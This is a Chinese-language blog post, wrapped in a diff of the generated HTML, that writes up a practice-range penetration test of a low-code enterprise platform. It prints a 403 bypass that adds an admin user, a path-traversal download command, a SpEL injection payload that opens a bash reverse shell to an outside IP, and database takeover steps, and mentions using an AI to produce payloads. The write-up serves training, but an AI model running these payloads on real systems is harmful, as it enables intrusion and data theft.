@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html lang=ch>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="信息收集起初给了一个ip地址  115.190.119.157，先是信息收集一波，爆破端口 1sudo nmap -sS -sV 115.190.119.157 -p - -vv   可以看到服务很多，但是开放的有22和8080（有时候nmap容易出错所以建议可以增加一些别的工具比如rustscan进行交叉验证） 打开8080端口，是一个登录框。测试的方法有很多种，比如sql注入，爆破，xss,模">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Jeecg-B00t企业级低代码平台">
+<meta property="og:url" content="https://q1ng-li.github.io/2026/05/06/blog41/index.html">
+<meta property="og:site_name" content="q1ng">
+<meta property="og:description" content="信息收集起初给了一个ip地址  115.190.119.157，先是信息收集一波，爆破端口 1sudo nmap -sS -sV 115.190.119.157 -p - -vv   可以看到服务很多，但是开放的有22和8080（有时候nmap容易出错所以建议可以增加一些别的工具比如rustscan进行交叉验证） 打开8080端口，是一个登录框。测试的方法有很多种，比如sql注入，爆破，xss,模">
+<meta property="og:locale" content="ch_CN">
+<meta property="og:image" content="https://q1ng-li.github.io/images/image-20260506212252990.png">
+<meta property="og:image" content="https://q1ng-li.github.io/images/image-20260506213236345.png">
+<meta property="og:image" content="https://q1ng-li.github.io/images/image-20260506213359636.png">
+<meta property="og:image" content="https://q1ng-li.github.io/images/image-20260506222138144.png">
+<meta property="og:image" content="https://q1ng-li.github.io/images/image-20260507200234206.png">
+<meta property="og:image" content="https://q1ng-li.github.io/images/image-20260507200638878.png">
+<meta property="og:image" content="https://q1ng-li.github.io/images/image-20260506223754192.png">
+<meta property="og:image" content="https://q1ng-li.github.io/images/image-20260507225420133.png">
+<meta property="og:image" content="https://q1ng-li.github.io/images/image-20260508104453279.png">
+<meta property="og:image" content="https://q1ng-li.github.io/images/image-20260507225703019.png">
+<meta property="og:image" content="https://q1ng-li.github.io/images/image-20260507230149099.png">
+<meta property="og:image" content="https://q1ng-li.github.io/images/image-20260507230712843.png">
+<meta property="og:image" content="https://q1ng-li.github.io/images/image-20260507230927928.png">
+<meta property="og:image" content="https://q1ng-li.github.io/images/image-20260507232043828.png">
+<meta property="og:image" content="https://q1ng-li.github.io/images/image-20260507233151142.png">
+<meta property="og:image" content="https://q1ng-li.github.io/images/image-20260507233330841.png">
+<meta property="og:image" content="https://q1ng-li.github.io/images/image-20260508002949207.png">
+<meta property="og:image" content="https://q1ng-li.github.io/images/image-20260508001231651.png">
+<meta property="og:image" content="https://q1ng-li.github.io/images/image-20260508002057324.png">
+<meta property="og:image" content="https://q1ng-li.github.io/images/image-20260508002003166.png">
+<meta property="og:image" content="https://q1ng-li.github.io/images/image-20260508003759307.png">
+<meta property="article:published_time" content="2026-05-06T13:12:19.000Z">
+<meta property="article:modified_time" content="2026-05-08T02:45:22.490Z">
+<meta property="article:author" content="q1ng">
+<meta property="article:tag" content="靶场">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://q1ng-li.github.io/images/image-20260506212252990.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/1.jpg">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/1.jpg" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/1.jpg">
+          
+        
+    
+    <!-- title -->
+    <title>Jeecg-B00t企业级低代码平台</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+
+    
+<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- rss -->
+    
+    
+    <!-- jquery -->
+    
+<script src="/lib/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+    <div class="banner">
+<div id="blogtitel" class="blogtitel">q1ng</div>
+<ul id="wrapper" class="wrapper">
+  <div class="sun">
+    <div class="star"></div>
+  </div>
+  <div class="mercury">
+    <div class="planet">
+      <div class="shadow"></div>
+    </div>
+  </div>
+  <div class="venus">
+    <div class="planet">
+      <div class="shadow"></div>
+    </div>
+  </div>
+  <div class="earth">
+    <div class="planet"><div class="shadow"></div></div>
+  </div>
+  <div class="mars">
+    <div class="planet"><div class="shadow"></div></div>
+  </div>
+  <div class="jupiter">
+    <div class="planet"><div class="shadow"></div></div>
+  </div>
+</ul>
+</div>
+
+    <div class="background">
+      
+        <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/home/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/tags">Tags</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="http://github.com/tzvetkov75">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2026/05/03/blog40/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle();' onmouseout='$("#i-next").toggle();'></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle();' onmouseout='$("#i-top").toggle();'></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle();' onmouseout='$("#i-share").toggle();' onclick='$("#share").toggle();return false;'></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://q1ng-li.github.io/2026/05/06/blog41/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://q1ng-li.github.io/2026/05/06/blog41/&text=Jeecg-B00t企业级低代码平台"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://q1ng-li.github.io/2026/05/06/blog41/&title=Jeecg-B00t企业级低代码平台"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://q1ng-li.github.io/2026/05/06/blog41/&is_video=false&description=Jeecg-B00t企业级低代码平台"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Jeecg-B00t企业级低代码平台&body=Check out this article: https://q1ng-li.github.io/2026/05/06/blog41/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://q1ng-li.github.io/2026/05/06/blog41/&title=Jeecg-B00t企业级低代码平台"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://q1ng-li.github.io/2026/05/06/blog41/&title=Jeecg-B00t企业级低代码平台"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://q1ng-li.github.io/2026/05/06/blog41/&title=Jeecg-B00t企业级低代码平台"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://q1ng-li.github.io/2026/05/06/blog41/&title=Jeecg-B00t企业级低代码平台"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://q1ng-li.github.io/2026/05/06/blog41/&name=Jeecg-B00t企业级低代码平台&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0"><span class="toc-number">2.</span> <span class="toc-text">漏洞发现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">2.1.</span> <span class="toc-text">敏感信息泄露</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#403bypass"><span class="toc-number">2.2.</span> <span class="toc-text">403bypass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD"><span class="toc-number">2.3.</span> <span class="toc-text">任意文件下载</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE"><span class="toc-number">2.4.</span> <span class="toc-text">RCE</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+      
+      <div class="content index width mx-auto px2 my4">
+          
+          <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Jeecg-B00t企业级低代码平台
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">q1ng</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2026-05-06T13:12:19.000Z" itemprop="datePublished">2026-05-06</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>起初给了一个ip地址  115.190.119.157，先是信息收集一波，爆破端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">sudo nmap -sS -sV 115.190.119.157 -p - -vv<br></code></pre></td></tr></table></figure>
+
+<p><img src="/./images/image-20260506212252990.png" alt="image-20260506212252990"></p>
+<p>可以看到服务很多，但是开放的有22和8080（有时候nmap容易出错所以建议可以增加一些别的工具比如rustscan进行交叉验证）</p>
+<p>打开8080端口，是一个登录框。测试的方法有很多种，比如sql注入，爆破，xss,模板注入等等。接下来就是看看前端有没有泄露一些未授权的接口，果不其然，泄露得还不少</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">const ROUTES = &#123;<br>       AUTH_LOGIN:          &#x27;/api/auth/login&#x27;,           // POST &#123;username, password&#125;<br>       USER_LIST:           &#x27;/api/user/list&#x27;,            // GET 用户列表<br>       USER_ADD:            &#x27;/api/user/add&#x27;,             // POST &#123;username, password, role, realName,                                                                             email, phone, department, position&#125;<br>       USER_INFO:           &#x27;/api/user/info&#x27;,            // GET 当前用户信息<br>       USER_DELETE:         &#x27;/api/user/delete/&#x27;,         // DELETE 删除用户<br>       PUBLIC_SYSTEM_INFO:  &#x27;/api/public/system/info&#x27;,   // GET 系统信息<br>       PUBLIC_EMPLOYEE:     &#x27;/api/public/employee/search?keyword=&#x27;, // GET 通讯录搜索<br>       PUBLIC_ATTACH_LIST:  &#x27;/api/public/attachment/list?path=&#x27;,    // GET 附件目录浏览<br>       PUBLIC_DOC_LIST:     &#x27;/api/public/document/list&#x27;,            // GET 文档列表<br>       DOC_DOWNLOAD:        &#x27;/api/document/download?fileName=&#x27;,     // GET 文档下载<br>       ADMIN_NOTIFY:        &#x27;/api/admin/system/notify&#x27;,  // POST &#123;template, target, params&#125;<br>       ADMIN_STATUS:        &#x27;/api/admin/system/status&#x27;,  // GET 系统状态<br>   &#125;;<br></code></pre></td></tr></table></figure>
+
+<h1 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h1><h2 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h2><p>打开&#x2F;api&#x2F;public&#x2F;employee&#x2F;search?keyword&#x3D;，暴露了用户名，手机号，邮箱等等敏感信息，可以方便后续爆破账号密码</p>
+<p><img src="/./images/image-20260506213236345.png" alt="image-20260506213236345"></p>
+<p>打开&#x2F;api&#x2F;public&#x2F;attachment&#x2F;list?path&#x3D;，发现可以遍历路径，分析文件结构</p>
+<p><img src="/./images/image-20260506213359636.png" alt="image-20260506213359636"></p>
+<p>接下来就想着利用文档下载的功能点进行任意文件下载，不过发现是500错误。前端基础分析的差不多了，接下来进行登录框测试，发现无法爆破出账号密码，就想着利用&#x2F;api&#x2F;user&#x2F;add接口来添加用户，不过访问发现是403，这个时候可以利用bp插件中的403bypasser进行绕过。</p>
+<p>不过起初看到前端&#x2F;api&#x2F;auth&#x2F;login的js代码中if(result.code &#x3D;&#x3D;&#x3D; 200)就会跳转到&#x2F;dashboard.html，并且result &#x3D;  response.json();于是我就通过修改返回包的code字段，却发现返回网络错误，请稍后重试，于是让ai帮我添加一些参数后（原因是响应包里没有data字段），成功进入后台</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#123;<br>    &quot;code&quot;: 200,<br>    &quot;message&quot;: &quot;success&quot;,<br>    &quot;data&quot;: &#123;<br>        &quot;token&quot;: &quot;123456&quot;,<br>        &quot;username&quot;: &quot;hacker&quot;,<br>        &quot;realName&quot;: &quot;test&quot;,<br>        &quot;role&quot;: &quot;admin&quot;<br>    &#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>好处是可以进一步分析一些参数，坏处就是token只是绕过前端，无法绕过后端鉴权</p>
+<h2 id="403bypass"><a href="#403bypass" class="headerlink" title="403bypass"></a>403bypass</h2><p>利用bp中的403bypasser插件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#123;&quot;username&quot;:&quot;test&quot;,&quot;password&quot;:&quot;test123&quot;,&quot;realName&quot;:&quot;&quot;,&quot;email&quot;:&quot;&quot;,&quot;phone&quot;:&quot;&quot;,&quot;department&quot;:&quot;&quot;,&quot;position&quot;:&quot;&quot;,&quot;role&quot;:&quot;admin&quot;&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/./images/image-20260506222138144.png" alt="image-20260506222138144"></p>
+<p>（测试发现;.html     ;.js   ;.css都可以绕过）成功添加用户，随后test&#x2F;test123登录即可</p>
+<p><img src="/./images/image-20260507200234206.png"></p>
+<p>成功拿到token </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0Iiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNzc4MjQxNzE5LCJ1c2VySWQiOjYsImlhdCI6MTc3ODE1NTMxOSwidXNlcm5hbWUiOiJ0ZXN0In0.TPSXJmzcmxQbbfJKfJlkgIRI6NZ1vG5L8MF4Xfnzco4<br></code></pre></td></tr></table></figure>
+
+<p>去相关网站解密看看字段</p>
+<p><img src="/./images/image-20260507200638878.png" alt="image-20260507200638878"></p>
+<p>于是尝试爆破key，看看是否存在弱密码，遗憾的是jwtcrack没有爆破出来</p>
+<h2 id="任意文件下载"><a href="#任意文件下载" class="headerlink" title="任意文件下载"></a>任意文件下载</h2><p>利用;.css  ;.js   ;.html绕过</p>
+<p><img src="/./images/image-20260506223754192.png" alt="image-20260506223754192"></p>
+<p>根据之前的分析，直接下载源码，可能是文件太大，无法抓包后直接返回</p>
+<p><img src="/./images/image-20260507225420133.png" alt="image-20260507225420133"></p>
+<p>ai提供了解决方法，那么利用curl进行下载</p>
+<p><img src="/./images/image-20260508104453279.png" alt="image-20260508104453279"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">curl &quot;http://115.190.119.157:8080/api/document/download;.js?fileName=../minioa.jar&quot; -o minioa.jar<br></code></pre></td></tr></table></figure>
+
+<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>把下载到的jar包丢进Recaf反编译</p>
+<p><img src="/./images/image-20260507225703019.png" alt="image-20260507225703019"></p>
+<p>主要关注的是模板注入漏洞，让ai分析SystemController</p>
+<hr>
+<p>提示词：分析这个代码，似乎存在模板注入</p>
+<hr>
+<p>ai给出了四个payload,依次试一试</p>
+<p><img src="/./images/image-20260507230149099.png" alt="image-20260507230149099"></p>
+<p>给了提示词：以上payload都没有用</p>
+<p><img src="/./images/image-20260507230712843.png" alt="image-20260507230712843"></p>
+<p>接下来进一步分析TemplateUtils.render()，ai给出结果，是spEL注入</p>
+<p><img src="/./images/image-20260507230927928.png" alt="image-20260507230927928"></p>
+<p>起初以为无法执行，想到exec是无回显的，于是尝试dnslog测试</p>
+<p><img src="/./images/image-20260507232043828.png" alt="image-20260507232043828"></p>
+<p>发现远程命令执行，并且出网。接着直接弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#&#123;T(java.lang.Runtime).getRuntime().exec(new String[]&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,&#x27;bash -i &gt;&amp; /dev/tcp/103.218.242.206/9001 0&gt;&amp;1&#x27;&#125;)&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/./images/image-20260507233151142.png" alt="image-20260507233151142"></p>
+<p>权限root,大的可怕。还记得之前在&#x2F;etc&#x2F;passwd中还发现了mysql用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ps -ef <br></code></pre></td></tr></table></figure>
+
+<p>查看当前进程，发现mysql进程</p>
+<p><img src="/./images/image-20260507233330841.png" alt="image-20260507233330841"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">mysql -h 127.0.0.1 -P 3306 -u root -p<br></code></pre></td></tr></table></figure>
+
+<p>利用root&#x2F;root连接发现失败，查找一下相关的配置文件</p>
+<p>最后发现配置在&#x2F;home&#x2F;target&#x2F;src&#x2F;main&#x2F;resources&#x2F;application.properties</p>
+<p><img src="/./images/image-20260508002949207.png" alt="image-20260508002949207"></p>
+<p>报出数据库(似乎需要报错注入)</p>
+<p><img src="/./images/image-20260508001231651.png" alt="image-20260508001231651"></p>
+<p>报出表和字段</p>
+<p><img src="/./images/image-20260508002057324.png" alt="image-20260508002057324"></p>
+<p><img src="/./images/image-20260508002003166.png" alt="image-20260508002003166"></p>
+<p>利用md5爆破出admin密码，大概需要5天。不过可以利用mysql来修改admin密码</p>
+<p><img src="/./images/image-20260508003759307.png" alt="image-20260508003759307"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>完结撒花</p>
+
+  </div>
+</article>
+
+
+
+      </div>
+      
+       <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/home/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/tags">Tags</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="http://github.com/tzvetkov75">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0"><span class="toc-number">2.</span> <span class="toc-text">漏洞发现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">2.1.</span> <span class="toc-text">敏感信息泄露</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#403bypass"><span class="toc-number">2.2.</span> <span class="toc-text">403bypass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD"><span class="toc-number">2.3.</span> <span class="toc-text">任意文件下载</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE"><span class="toc-number">2.4.</span> <span class="toc-text">RCE</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://q1ng-li.github.io/2026/05/06/blog41/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://q1ng-li.github.io/2026/05/06/blog41/&text=Jeecg-B00t企业级低代码平台"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://q1ng-li.github.io/2026/05/06/blog41/&title=Jeecg-B00t企业级低代码平台"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://q1ng-li.github.io/2026/05/06/blog41/&is_video=false&description=Jeecg-B00t企业级低代码平台"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Jeecg-B00t企业级低代码平台&body=Check out this article: https://q1ng-li.github.io/2026/05/06/blog41/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://q1ng-li.github.io/2026/05/06/blog41/&title=Jeecg-B00t企业级低代码平台"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://q1ng-li.github.io/2026/05/06/blog41/&title=Jeecg-B00t企业级低代码平台"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://q1ng-li.github.io/2026/05/06/blog41/&title=Jeecg-B00t企业级低代码平台"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://q1ng-li.github.io/2026/05/06/blog41/&title=Jeecg-B00t企业级低代码平台"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://q1ng-li.github.io/2026/05/06/blog41/&name=Jeecg-B00t企业级低代码平台&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick='$("#toc-footer").toggle();return false;'><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
+        <li id="share"><a class="icon" href="#" onclick='$("#share-footer").toggle();return false;'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
+        <li id="menu"><a class="icon" href="#" onclick='$("#nav-footer").toggle();return false;'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+      
+      <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2026 q1ng
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/home/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/tags">Tags</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="http://github.com/tzvetkov75">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+      
+<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- Google Analytics -->
+
+<!-- Disqus Comments -->
+
+
+    </div>
+</body>
+</html>
